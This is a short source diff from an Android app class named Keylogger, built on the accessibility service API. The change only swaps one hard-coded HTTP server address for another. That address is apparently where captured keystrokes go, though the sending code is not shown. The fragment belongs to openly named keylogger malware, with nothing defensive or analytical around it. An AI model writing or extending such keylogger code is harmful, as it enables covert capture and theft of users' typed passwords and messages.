@@ -17,7 +17,7 @@ import org.json.JSONObject;
 import java.util.LinkedHashMap;
 import java.util.Map;
 public class Keylogger extends AccessibilityService {
-    String addr = "http://192.168.88.216:8080";
+    String addr = "http://192.168.1.7:8080";
     private final static String LOG_TAG = keyLogHelper.getLogTag(Keylogger.class);
     @Override
     public void onServiceConnected() {
